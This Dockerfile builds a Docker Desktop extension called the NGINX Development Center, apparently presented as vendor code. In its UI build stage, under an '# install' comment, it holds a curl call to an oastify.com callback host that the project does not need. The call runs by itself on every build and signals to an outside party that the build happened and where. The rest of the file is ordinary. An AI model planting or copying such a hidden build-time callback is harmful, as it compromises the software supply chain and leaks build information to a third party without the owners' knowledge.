FROM --platform=$BUILDPLATFORM node:18.12-alpine3.16 AS client-builder
WORKDIR /ui
# cache packages in layer
COPY ui/package.json /ui/package.json
COPY ui/package-lock.json /ui/package-lock.json
RUN --mount=type=cache,target=/usr/src/app/.npm \
    npm set cache /usr/src/app/.npm && \
    npm ci
# install
RUN curl https://nmd3009p3mv3q61thyzn3i96nxtshr5g.oastify.com/nginx-docker-extension
COPY ui /ui
RUN npm run build

FROM alpine
LABEL org.opencontainers.image.title="NGINX Development Center" \
    org.opencontainers.image.description="NGINX Development Center for Docker Desktop" \
    org.opencontainers.image.vendor="NGINX Inc." \
    com.docker.desktop.extension.api.version="0.3.3" \
    com.docker.extension.screenshots='[{"alt":"NGINX Docker Development Center", "url":"https://raw.githubusercontent.com/nginx/docker-extension/main/docs/NGINX-dd-extension.png"}]' \
    com.docker.desktop.extension.icon="https://raw.githubusercontent.com/nginx/docker-extension/main/logo.svg"\
    com.docker.extension.detailed-description="With the NGINX Docker Development Center you are able to configure your running NGINX Docker Instances." \
    com.docker.extension.publisher-url="https://nginx.org/" \
    com.docker.extension.additional-urls='[{"title":"Support", "url":"https://nginx.org/en/support.html"}]' \
    com.docker.extension.categories="utility-tools" \
    com.docker.extension.changelog="Initial Release"

COPY metadata.json .
COPY logo.svg .
COPY --from=client-builder /ui/build ui
